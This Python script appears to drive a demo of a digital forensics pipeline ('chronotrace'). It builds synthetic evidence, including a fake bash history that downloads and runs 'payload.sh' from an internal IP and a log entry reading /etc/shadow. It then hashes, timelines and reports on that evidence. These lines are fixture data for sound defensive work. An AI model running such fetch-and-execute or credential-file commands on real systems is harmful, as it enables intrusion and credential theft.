import sys
from pathlib import Path

# Ensure src is at the top of sys.path
src_dir = Path(__file__).resolve().parent / "src"
if str(src_dir) not in sys.path:
    sys.path.insert(0, str(src_dir))

import datetime
import json
import os
import shutil
import sqlite3
import struct
import zipfile
from chronotrace.core.case import Case
from chronotrace.timeline.query import TimelineQuery


def prepare_sample_evidence(evidence_dir: Path) -> None:
    """Create a realistic set of digital evidence files."""
    evidence_dir.mkdir(parents=True, exist_ok=True)

    # 1. Linux Authentication & Shell Log (auth.log and .bash_history)
    auth_log = evidence_dir / "auth.log"
    auth_log.write_text(
        "Mar 11 02:14:07 WS-SEC-01 sshd[4401]: Accepted password for root from 192.168.1.155 port 49122 ssh2\n"
        "Mar 11 02:15:30 WS-SEC-01 sudo: root : TTY=pts/1 ; COMMAND=/usr/bin/cat /etc/shadow\n"
        "Mar 11 02:18:45 WS-SEC-01 sshd[4401]: Received disconnect from 192.168.1.155: Client disconnect\n",
        encoding="utf-8",
    )

    bash_hist = evidence_dir / "bash_history"
    bash_hist.write_text(
        "#1710123300\nwget http://192.168.1.200/payload.sh\n"
        "#1710123360\nchmod +x payload.sh\n"
        "#1710123420\n./payload.sh\n",
        encoding="utf-8",
    )

    # 2. Windows Event Log Dump (Security EVTX)
    sec_evtx = evidence_dir / "Security_Events.jsonl"
    events = [
        {"TimeCreated": "2024-03-11T02:14:07.000000Z", "EventID": 4624, "TargetUserName": "admin", "Computer": "DC01"},
        {"TimeCreated": "2024-03-11T02:16:15.000000Z", "EventID": 4688, "TargetUserName": "admin", "Computer": "DC01", "NewProcessName": "C:\\Windows\\System32\\cmd.exe"},
        {"TimeCreated": "2024-03-11T02:17:30.000000Z", "EventID": 7045, "ServiceName": "BackdoorSvc", "Computer": "DC01"},
        {"TimeCreated": "2024-03-11T02:20:00.000000Z", "EventID": 1102, "TargetUserName": "admin", "Computer": "DC01"},
    ]
    with open(sec_evtx, "w", encoding="utf-8") as f:
        for ev in events:
            f.write(json.dumps(ev) + "\n")

    # 3. Web Browser History (Chromium SQLite History database)
    browser_db = evidence_dir / "History"
    conn = sqlite3.connect(browser_db)
    cur = conn.cursor()
    cur.execute("CREATE TABLE urls (id INTEGER PRIMARY KEY, url TEXT, title TEXT, visit_count INTEGER, last_visit_time INTEGER)")
    # 2024-03-11T02:10:00Z in WebKit timestamp (microseconds since 1601-01-01)
    # 1601 to 1970 = 11644473600 seconds = 11644473600000000 us.
    # 2024-03-11 = ~13354577400000000 us.
    cur.execute("INSERT INTO urls VALUES (1, 'https://github.com/malicious/repo', 'Exploit Repository', 1, 13354577400000000)")
    cur.execute("INSERT INTO urls VALUES (2, 'https://pastebin.com/raw/d849fa', 'Exfiltrated Data Dump', 2, 13354578000000000)")
    conn.commit()
    conn.close()

    # 4. Office OOXML Document (.docx with embedded metadata in core.xml)
    docx_file = evidence_dir / "investigation_memo.docx"
    with zipfile.ZipFile(docx_file, "w") as z:
        core_xml = (
            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
            '<cp:coreProperties xmlns:cp="http://schemas.openxmlformats.org/package/2006/metadata/core-properties" '
            'xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:dcterms="http://purl.org/dc/terms/">\n'
            '  <dc:creator>Alice Analyst</dc:creator>\n'
            '  <cp:lastModifiedBy>Bob Subject</cp:lastModifiedBy>\n'
            '  <dcterms:created>2024-03-10T14:30:00Z</dcterms:created>\n'
            '  <dcterms:modified>2024-03-11T01:50:00Z</dcterms:modified>\n'
            '</cp:coreProperties>'
        )
        z.writestr("docProps/core.xml", core_xml)
        z.writestr("word/document.xml", "<w:document><w:body><w:p><w:r><w:t>Confidential Report</w:t></w:r></w:p></w:body></w:document>")

    # 5. Compressed Evidence Archive (.zip)
    zip_evidence = evidence_dir / "exfiltrated_files.zip"
    with zipfile.ZipFile(zip_evidence, "w") as z:
        z.writestr("passwords.txt", "secret_service_account_password_123")
        z.writestr("financial_report.pdf", "%PDF-1.4 /CreationDate (D:20240311020000Z)")


def run_pipeline():
    print("=" * 75)
    print("  CHRONOTRACE AUTOMATED DIGITAL FORENSICS PIPELINE")
    print("=" * 75)

    base_dir = Path("./run_artifacts").resolve()
    if base_dir.exists():
        shutil.rmtree(base_dir)
    base_dir.mkdir(parents=True)

    evidence_src = base_dir / "raw_evidence"
    case_path = base_dir / "CASE-2026-LIVE"

    # Step 1: Prepare evidence
    print("\n[1/7] Preparing sample multi-source forensic evidence...")
    prepare_sample_evidence(evidence_src)
    print(f"      Created 5 forensic evidence sources in {evidence_src}")

    # Step 2: Create Case
    print("\n[2/7] Initializing Forensic Case...")
    case = Case.create(
        case_id="CASE-2026-LIVE",
        out_dir=case_path,
        examiner="Alex Mercer (Senior Forensics Examiner)",
        organization="Cyber Incident Response Unit",
        authorization_ref="WARRANT-2026-0881",
        description="Investigation into unauthorized access and privilege escalation",
    )
    print(f"      Case directory created: {case.root}")
    print(f"      Chain-of-custody ledger initialized: {case.ledger_path}")

    # Step 3: Acquire Evidence with Streaming SHA-256
    print("\n[3/7] Acquiring Digital Evidence & Generating SHA-256 Hashes...")
    for ev_file in sorted(evidence_src.iterdir()):
        ev_id = f"EV-{ev_file.name[:6].upper()}"
        res = case.acquire(
            source=ev_file,
            output_filename=ev_file.name,
            evidence_id=ev_id,
            notes=f"Forensic acquisition of {ev_file.name}",
        )
        print(f"      [+] Acquired {ev_file.name:25} | SHA-256: {res['hashes']['sha256'][:16]}... | {res['size_bytes']:6} bytes")

    # Step 4: Ingest & Extract System Artefacts and File Metadata
    print("\n[4/7] Ingesting Evidence & Parsing Artefacts...")
    raw_events = case.extract(profile="all")
    print(f"      [+] Extracted {len(raw_events)} forensic events across plugins.")

    # Step 5: Chronological Timeline Reconstruction
    print("\n[5/7] Reconstructing Chronological Activity Super-Timeline...")
    sorted_events = case.build_timeline()
    print(f"      [+] Super-timeline synthesized: {len(sorted_events)} chronologically sorted events.")
    print(f"      [+] Persisted dual-store: {case.index_dir / 'events.parquet'} & {case.index_dir / 'events.sqlite'}")

    # Step 6: Verify Case Integrity & Chain of Custody
    print("\n[6/7] Cryptographic Integrity Verification & Ledger Replay...")
    verify_res = case.verify(rehash_evidence=True)
    print(f"      [+] Overall Integrity Status:  {verify_res['overall_status']}")
    print(f"      [+] Custody Ledger Replay:     {verify_res['ledger_status']} ({verify_res['checked_items']['ledger_entries']} entries verified)")
    print(f"      [+] Evidence Re-hash Check:    {verify_res['evidence_status']} ({verify_res['checked_items']['evidence_files']} files verified)")
    print(f"      [+] Derived Store Check:       {verify_res['derived_status']}")
    print(f"      [+] Merkle Root Digest:        {case.manifest.data['merkle_root']}")

    # Step 7: Produce Structured Investigation Reports
    print("\n[7/7] Generating Structured Investigation Reports...")
    reports = case.report(
        template="full",
        formats=("html", "json", "csv", "md"),
        redact=("usernames", "ips"),
    )
    for fmt_name, path_str in reports.items():
        print(f"      [+] {fmt_name.upper():5} Report: {path_str}")

    # Query Timeline Summary
    print("\n" + "=" * 75)
    print("  ACTIVITY SUPER-TIMELINE (Chronological Sample)")
    print("=" * 75)
    tq = TimelineQuery(case.index_dir)
    events_sample = tq.filter_events(limit=12)
    print(f"{'UTC Timestamp':<28} | {'Action':<16} | {'User':<10} | {'Object / Activity':<32}")
    print("-" * 92)
    for row in events_sample:
        ts = row['timestamp_utc'][:26]
        act = row['action'][:15]
        usr = row['user'][:9]
        obj = (row['object_path'] or '')[:30]
        print(f"{ts:<28} | {act:<16} | {usr:<10} | {obj:<32}")

    print("\n" + "=" * 75)
    print("  EXECUTION COMPLETE: All 6 Project Objectives Successfully Executed!")
    print("=" * 75 + "\n")


if __name__ == "__main__":
    run_pipeline()
